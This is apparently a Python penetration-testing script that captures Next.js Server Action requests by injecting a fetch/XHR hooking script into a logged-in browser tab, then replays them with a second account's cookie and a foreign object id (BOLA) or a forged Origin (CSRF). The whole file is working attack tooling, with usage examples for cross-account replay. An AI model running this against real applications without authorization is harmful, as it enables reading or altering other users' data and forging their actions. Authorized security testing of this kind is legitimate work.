#!/usr/bin/env python3
"""nextjs-server-action-probe.py — capture & replay a Next.js App Router Server Action.

Why: App Router forms POST to the CURRENT page URL with a `next-action` header and
ENCRYPTED bound args, so you cannot reconstruct the body by guessing field names.
Capture the live wire, then replay it (optionally with a foreign object id for BOLA,
or an evil Origin for CSRF).

Modes
-----
  capture   inject a fetch/XHR hook into a live browser tab (Camofox/Chrome-CDP), trigger
            the action by clicking, and dump the captured request (url, headers, body).
  replay    HTTP-replay a captured action against the target with a session cookie.

Usage
-----
  # 1. capture (needs a browser tab already logged in)
  python nextjs-server-action-probe.py capture \
      --camofox http://127.0.0.1:9377 --user hermes2 --tab <tabId> \
      --navigate "https://TARGET/app/sources/<uuid>" --click-ref e20

  # 2. replay (BOLA: account-B cookie + account-A object id)
  python nextjs-server-action-probe.py replay \
      --target https://TARGET --path "/app/sources/<A_UUID>?new=1" \
      --action <40-or-64-hex-id> --cookie-file b_jar.txt \
      --tree '["",{"children":["app",{"children":["sources",{"children":[["id","<A_UUID>","d"],{"children":["__PAGE__",{},null,null]},null,null]},null,null]},null,null]},null,null,true]' \
      --field _1_propertyId=<A_UUID> --field _1_percent=1

Notes / pitfalls baked in
-------------------------
* The response body `1:E{"digest":"…"}` means the SHAPE is wrong (missing header / wrong
  FormData field / stale router-state-tree) — it is NOT an auth failure. Fall back to the
  browser-DOM path if a legit replay still 500s.
* `next-router-state-tree` is URL-encoded JSON of the route tree.
* Never guess field names; read them from the capture (real ones seen: _1_amount,
  _1_txnDate, _1_category, _1_submissionId, _1_propertyId, _1_type, interval, nino,
  mfaCode, body, shareId).
* Test the CONTROL (same body, correct Origin, owner cookie) before interpreting a
  foreign-origin/foreign-object failure.
"""
import argparse, base64, http.cookiejar, json, os, sys, time, urllib.parse, urllib.request, uuid

HOOK_JS = r"""(function(){
  window.__cap=[];
  function save(){try{document.documentElement.setAttribute('data-cap',JSON.stringify(window.__cap.slice(-20)))}catch(e){}}
  function ser(bd){try{
      if(bd instanceof FormData){var p=[];bd.forEach(function(v,k){p.push(k+'='+v)});return 'FD{'+p.join('&')+'}'}
      if(typeof bd==='string')return bd;
      return JSON.stringify(bd);}catch(e){return '[unserializable]'}}
  var of=window.fetch;
  window.fetch=function(a,b){try{var o=b||{};var h={};
    if(o.headers){if(o.headers.forEach){o.headers.forEach(function(v,k){h[k]=v})}else{for(var k in o.headers){h[k]=o.headers[k]}}}
    window.__cap.push({u:(typeof a==='string')?a:a.url,m:o.method||'GET',h:h,b:String(ser(o.body)).slice(0,4000)});
    save();}catch(e){}
    return of.apply(this,arguments)};
  var oo=XMLHttpRequest.prototype.open, os=XMLHttpRequest.prototype.send, oh=XMLHttpRequest.prototype.setRequestHeader;
  XMLHttpRequest.prototype.open=function(m,u){this.__m=m;this.__u=u;this.__h={};return oo.apply(this,arguments)};
  XMLHttpRequest.prototype.setRequestHeader=function(k,v){try{this.__h[k]=v}catch(e){};return oh.apply(this,arguments)};
  XMLHttpRequest.prototype.send=function(b){try{window.__cap.push({t:'xhr',u:this.__u,m:this.__m,h:this.__h,b:String(ser(b)).slice(0,4000)});save()}catch(e){}return os.apply(this,arguments)};
  return 'hooked';
})()"""


def main_capture(a):
    """Inject the hook (main-world) into a Camofox tab, click, read the capture."""
    def ev(expr, wait=False):
        body = json.dumps({"userId": a.user, "expression": expr, "awaitPromise": wait}).encode()
        req = urllib.request.Request(f"{a.camofox}/tabs/{a.tab}/evaluate", data=body,
                                     headers={"Content-Type": "application/json"})
        return json.loads(urllib.request.urlopen(req, timeout=45).read())

    if a.navigate:
        ev(f'location.href={json.dumps(a.navigate)}'); time.sleep(a.wait)
    # main-world injection: <script>.textContent runs with page globals
    inj = ('(function(){var s=document.createElement("script");s.textContent='
           + json.dumps(HOOK_JS) + ';document.documentElement.appendChild(s);s.remove();return "ok"})()')
    print("hook:", ev(inj).get("result"))
    if a.click_ref:
        body = json.dumps({"userId": a.user, "ref": a.click_ref}).encode()
        urllib.request.urlopen(urllib.request.Request(
            f"{a.camofox}/tabs/{a.tab}/click", data=body,
            headers={"Content-Type": "application/json"}), timeout=30).read()
        time.sleep(a.wait)
    raw = ev('document.documentElement.getAttribute("data-cap")||"none"').get("result", "none")
    try:
        caps = json.loads(raw)
    except Exception:
        print("no capture:", raw[:300]); return
    for e in caps:
        if e.get("m") in ("POST", "PUT", "PATCH", "DELETE"):
            print("=" * 60)
            print(e.get("m"), e.get("u"))
            print("  next-action:", (e.get("h") or {}).get("next-action"))
            print("  tree:", str((e.get("h") or {}).get("next-router-state-tree"))[:160], "...")
            print("  body:", str(e.get("b"))[:1200])


def main_replay(a):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    if a.cookie_file and os.path.exists(a.cookie_file):
        raw = open(a.cookie_file).read().strip()
        for part in raw.split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                cj.set_cookie(http.cookiejar.Cookie(0, k, v, None, False, a.target.split("/")[2], False, False, "/", True, False, None, False, None, None, {}))
    b = "----WebKitFormBoundary" + uuid.uuid4().hex[:16]
    fields = {}
    for f in a.field:
        k, v = f.split("=", 1); fields[k] = v
    # trailing result-marker field
    fields.setdefault("0", '[{},"$K1"]')
    body = "".join(f'--{b}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'
                   for k, v in fields.items()) + f"--{b}--\r\n"
    h = {"next-action": a.action, "Accept": "text/x-component",
         "Content-Type": f"multipart/form-data; boundary={b}",
         "Origin": a.origin or a.target, "Referer": a.target + a.path,
         "User-Agent": "Mozilla/5.0", "next-router-state-tree": a.tree or ""}
    req = urllib.request.Request(a.target + a.path, data=body.encode(), headers=h, method="POST")
    try:
        r = opener.open(req, timeout=40)
        print("STATUS", r.status, "LOCATION", r.headers.get("Location"))
        print(r.read().decode("utf-8", "ignore")[:600])
    except urllib.error.HTTPError as e:
        print("STATUS", e.code, "LOCATION", e.headers.get("Location"))
        print(e.read().decode("utf-8", "ignore")[:600])


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    sub = p.add_subparsers(dest="mode", required=True)
    c = sub.add_parser("capture")
    c.add_argument("--camofox", default="http://127.0.0.1:9377")
    c.add_argument("--user", default="hermes2")
    c.add_argument("--tab", required=True)
    c.add_argument("--navigate")
    c.add_argument("--click-ref")
    c.add_argument("--wait", type=int, default=6)
    c.set_defaults(fn=main_capture)
    r = sub.add_parser("replay")
    r.add_argument("--target", required=True)
    r.add_argument("--path", required=True)
    r.add_argument("--action", required=True)
    r.add_argument("--cookie-file")
    r.add_argument("--tree", default="")
    r.add_argument("--origin", default="")
    r.add_argument("--field", action="append", default=[])
    r.set_defaults(fn=main_replay)
    args = p.parse_args()
    args.fn(args)
